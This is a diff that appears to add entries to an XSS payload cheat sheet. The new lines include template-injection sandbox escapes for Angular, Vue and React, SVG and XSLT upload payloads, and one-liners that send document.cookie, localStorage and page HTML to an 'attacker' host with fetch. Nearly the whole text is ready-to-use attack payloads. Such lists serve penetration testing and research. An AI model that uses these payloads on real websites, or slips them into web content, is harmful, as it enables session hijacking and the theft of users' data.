@@ -1659,3 +1659,18 @@ x”</title><img src%3dx onerror%3dalert(1)>
 <svg•onload=alert(1)>
 # Change request method (WAF only filters POST body):
 GET /?q=<script>alert(1)</script>
+# ─── framework client-side template injection (skraft9/vulnerability-research) ───
+{{constructor.constructor('alert(1)')()}}                          # Angular/Vue expression sandbox escape
+{{$eval.constructor('alert(1)')()}}                                 # AngularJS 1.5+
+{{[].__proto__.constructor.constructor('alert(1)')()}}              # JS proto chain
+<div v-html="'<img src=x onerror=alert(1)>'"></div>                 # Vue3 v-html
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>  # React
+<a href="javascript:alert(1)">clickable</a>                         # href javascript: in React
+# ─── SVG upload → XSS ───
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="100" height="100"/></svg>
+<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//attacker/e?'+document.cookie)</script></svg>
+# ─── XSLT upload → XSS on render ───
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><html><a:body xmlns:a="http://www.w3.org/1999/xhtml" onload="alert(1)"/></html></xsl:template></xsl:stylesheet>
+# ─── LocalStorage exfil after XSS lands ───
+fetch('https://attacker/e?d='+btoa(JSON.stringify(localStorage)))
+fetch('https://attacker/e', {method:'POST', body: btoa(document.documentElement.outerHTML)})
